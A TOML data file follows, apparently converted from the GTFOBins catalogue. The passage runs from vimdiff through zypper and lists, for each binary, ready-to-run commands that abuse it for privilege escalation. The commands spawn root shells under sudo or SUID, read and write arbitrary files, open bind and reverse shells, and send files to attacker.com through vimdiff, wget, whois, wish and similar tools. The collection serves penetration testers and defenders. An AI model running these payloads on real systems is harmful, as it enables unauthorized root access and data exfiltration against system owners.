    [[privilege-esclation.exps.file-upload]]
      exp = "export URL=http://attacker.com/\nexport LFILE=file_to_send\nvimdiff -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export LPORT=8888\nvimdiff -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nvimdiff -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n"
    [[privilege-esclation.exps.file-write]]
      exp = "vimdiff file_to_write\niDATA\n^[\nw\n"
    [[privilege-esclation.exps.library-load]]
      exp = "vimdiff -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./vimdiff -c ':lua os.execute(\"reset; exec sh\")'"
    [[privilege-esclation.exps.non-interactive-bind-shell]]
      exp = "export LPORT=12345\nvimdiff -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n"
    [[privilege-esclation.exps.non-interactive-reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nvimdiff -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nvimdiff -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.shell]]
      exp = "vimdiff -c ':!/bin/sh'"
    [[privilege-esclation.exps.shell]]
      exp = "vimdiff\n:set shell=/bin/sh\n:shell\n"
    [[privilege-esclation.exps.shell]]
      exp = "vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    [[privilege-esclation.exps.shell]]
      exp = "vimdiff -c ':lua os.execute(\"reset; exec sh\")'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo vimdiff -c ':!/bin/sh'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo vimdiff -c ':lua os.execute(\"reset; exec sh\")'"
    [[privilege-esclation.exps.suid]]
      exp = "./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
[[privilege-esclation]]
  Name = "vipw"
  Description = "This command allows to edit some designated files (`/etc/passwd`, `/etc/group`, `/etc/shadow` and `/etc/gshadow`) safely by spawning the default editor (falling back to [`vim`](/gtfobins/vim/), other functions may apply). Despite requiring superuser privileges to run, the editor is executed as the unprivileged user when run as SUID or with `sudo`."
  Tags = ["suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "sudo vipw"
    [[privilege-esclation.exps.suid]]
      exp = "./vipw"
[[privilege-esclation]]
  Name = "virsh"
  Description = ""
  Tags = ["sudo", "file-write", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE_DIR=/root\nLFILE_NAME=file_to_read\n\nSPATH=file_to_save\n\nvirsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR\nvirsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH\nvirsh -c qemu:///system pool-destroy x\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE_DIR=/root\nLFILE_NAME=file_to_write\n\necho 'data' > data_to_write\n\nTF=$(mktemp)\ncat > $TF <<EOF\n<volume type='file'>\n  <name>y</name>\n  <key>$LFILE_DIR/$LFILE_NAME</key>\n  <source>\n  </source>\n  <capacity unit='bytes'>5</capacity>\n  <allocation unit='bytes'>4096</allocation>\n  <physical unit='bytes'>5</physical>\n  <target>\n    <path>$LFILE_DIR/$LFILE_NAME</path>\n    <format type='raw'/>\n    <permissions>\n      <mode>0600</mode>\n      <owner>0</owner>\n      <group>0</group>\n    </permissions>\n  </target>\n</volume>\nEOF\n\nvirsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR\nvirsh -c qemu:///system vol-create --pool x --file $TF\nvirsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write\nvirsh -c qemu:///system pool-destroy x\n"
    [[privilege-esclation.exps.sudo]]
      exp = "SCRIPT=script_to_run\nTF=$(mktemp)\ncat > $TF << EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='$SCRIPT'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nsudo virsh -c qemu:///system create $TF\nvirsh -c qemu:///system destroy x\n"
[[privilege-esclation]]
  Name = "volatility"
  Description = "This command requires some valid coredump file which, if not available, can be uploaded to the target. The `volshell` command spawns a [`python`](/gtfobins/python/) shell, other functions may apply."
  Tags = ["shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "volatility -f file.dump volshell\n__import__('os').system('/bin/sh')\n"
[[privilege-esclation]]
  Name = "w3m"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nw3m \"$LFILE\" -dump\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo w3m \"$LFILE\" -dump\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./w3m \"$LFILE\" -dump\n"
[[privilege-esclation]]
  Name = "wall"
  Description = "The textual file is dumped on the current TTY (neither to `stdout` nor to `stderr`)."
  Tags = ["sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo wall --nobanner \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "watch"
  Description = ""
  Tags = ["shell", "suid", "sudo", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./watch 'reset; exec sh 1>&0 2>&0'"
    [[privilege-esclation.exps.shell]]
      exp = "watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
    [[privilege-esclation.exps.suid]]
      exp = "./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'"
[[privilege-esclation]]
  Name = "wc"
  Description = "The file content is parsed as a sequence of `\\x00` separated paths. On error the file content appears in a message, so this may not be suitable to read binary files."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nwc --files0-from \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo wc --files0-from \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./wc --files0-from \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "wget"
  Description = ""
  Tags = ["file-download", "suid", "sudo", "shell", "file-upload", "file-read", "file-write"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nwget $URL -O $LFILE\n"
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nwget -i $LFILE\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "URL=http://attacker.com/\nLFILE=file_to_send\nwget --post-file=$LFILE $URL\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\nwget -i $TF -o $LFILE\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF\nwget --use-askpass=$TF 0\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF\nsudo wget --use-askpass=$TF 0\n"
    [[privilege-esclation.exps.suid]]
      exp = "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF\n./wget --use-askpass=$TF 0\n"
[[privilege-esclation]]
  Name = "whiptail"
  Description = "The file is shown in an interactive TUI dialog made for displaying text, arrows can be used to scroll long content."
  Tags = ["sudo", "file-read", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nwhiptail --textbox --scrolltext \"$LFILE\" 0 0\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo whiptail --textbox --scrolltext \"$LFILE\" 0 0\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./whiptail --textbox --scrolltext \"$LFILE\" 0 0\n"
[[privilege-esclation]]
  Name = "whois"
  Description = "`whois` hangs waiting for the remote peer to close the socket.\n"
  Tags = ["file-upload", "file-download"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT > \"$LFILE\"\n"
    [[privilege-esclation.exps.file-download]]
      exp = "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT | base64 -d > \"$LFILE\"\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nwhois -h $RHOST -p $RPORT \"`cat $LFILE`\"\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nwhois -h $RHOST -p $RPORT \"`base64 $LFILE`\"\n"
[[privilege-esclation]]
  Name = "wireshark"
  Description = ""
  Tags = ["sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "PORT=4444\nsudo wireshark -c 1 -i lo -k -f \"udp port $PORT\" &\necho 'DATA' | nc -u 127.127.127.127 \"$PORT\"\n"
[[privilege-esclation]]
  Name = "wish"
  Description = ""
  Tags = ["shell", "non-interactive-reverse-shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.non-interactive-reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\necho 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish\n"
    [[privilege-esclation.exps.shell]]
      exp = "wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
[[privilege-esclation]]
  Name = "xargs"
  Description = ""
  Tags = ["sudo", "shell", "file-read", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nxargs -a \"$LFILE\" -0\n"
    [[privilege-esclation.exps.shell]]
      exp = "xargs -a /dev/null sh"
    [[privilege-esclation.exps.shell]]
      exp = "echo x | xargs -Iy sh -c 'exec sh 0<&1'"
    [[privilege-esclation.exps.shell]]
      exp = "xargs -Ix sh -c 'exec sh 0<&1'\nx^D^D\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo xargs -a /dev/null sh"
    [[privilege-esclation.exps.suid]]
      exp = "./xargs -a /dev/null sh -p"
[[privilege-esclation]]
  Name = "xdotool"
  Description = "This requires a running X server."
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "xdotool exec --sync /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo xdotool exec --sync /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./xdotool exec --sync /bin/sh -p"
[[privilege-esclation]]
  Name = "xelatex"
  Description = ""
  Tags = ["limited-suid", "shell", "file-read", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
    [[privilege-esclation.exps.shell]]
      exp = "xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
[[privilege-esclation]]
  Name = "xetex"
  Description = ""
  Tags = ["shell", "sudo", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./xetex --shell-escape '\\write18{/bin/sh}\\end'\n"
    [[privilege-esclation.exps.shell]]
      exp = "xetex --shell-escape '\\write18{/bin/sh}\\end'\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo xetex --shell-escape '\\write18{/bin/sh}\\end'\n"
[[privilege-esclation]]
  Name = "xmodmap"
  Description = "The read file content is corrupted by error prints.\n"
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nxmodmap -v $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo xmodmap -v $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./xmodmap -v $LFILE\n"
[[privilege-esclation]]
  Name = "xmore"
  Description = "The file is displayed in a Xorg window, so it needs a working graphical environment."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nxmore $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo xmore $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./xmore $LFILE\n"
[[privilege-esclation]]
  Name = "xpad"
  Description = "This is a GUI application. The file content is displayed in a sticky note."
  Tags = ["file-read", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nxpad -f \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo xpad -f \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "xxd"
  Description = ""
  Tags = ["file-write", "file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nxxd \"$LFILE\" | xxd -r\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\necho DATA | xxd | xxd -r - \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r\n"
[[privilege-esclation]]
  Name = "xz"
  Description = ""
  Tags = ["suid", "sudo", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nxz -c \"$LFILE\" | xz -d\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo xz -c \"$LFILE\" | xz -d\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d\n"
[[privilege-esclation]]
  Name = "yarn"
  Description = ""
  Tags = ["sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "yarn exec /bin/sh"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nyarn --cwd $TF install\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo yarn exec /bin/sh"
[[privilege-esclation]]
  Name = "yash"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "yash"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo yash"
    [[privilege-esclation.exps.suid]]
      exp = "./yash"
[[privilege-esclation]]
  Name = "yelp"
  Description = ""
  Tags = ["file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nyelp \"man:$LFILE\"\n"
[[privilege-esclation]]
  Name = "yum"
  Description = ""
  Tags = ["file-download", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "RHOST=attacker.com\nRFILE=file_to_get.rpm\nyum install http://$RHOST/$RFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo yum localinstall -y x-1.0-1.noarch.rpm\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n"
[[privilege-esclation]]
  Name = "zathura"
  Description = "The interaction happens in a GUI window, while the shell is dropped in the terminal."
  Tags = ["sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'\n"
[[privilege-esclation]]
  Name = "zip"
  Description = ""
  Tags = ["file-read", "shell", "sudo", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file-to-read\nTF=$(mktemp -u)\nzip $TF $LFILE\nunzip -p $TF\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "TF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -u)\nzip $TF /etc/hosts -T -TT 'sh #'\nrm $TF\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n"
[[privilege-esclation]]
  Name = "zsh"
  Description = ""
  Tags = ["file-read", "file-write", "shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "export LFILE=file_to_read\nzsh -c 'echo \"$(<$LFILE)\"'\n"
    [[privilege-esclation.exps.file-write]]
      exp = "export LFILE=file_to_write\nzsh -c 'echo DATA >$LFILE'\n"
    [[privilege-esclation.exps.shell]]
      exp = "zsh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo zsh"
    [[privilege-esclation.exps.suid]]
      exp = "./zsh"
[[privilege-esclation]]
  Name = "zsoelim"
  Description = "The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nzsoelim \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo zsoelim \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./zsoelim \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "zypper"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "zypper x\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nexport PATH=$TF:$PATH\nzypper x\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo zypper x\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x\n"
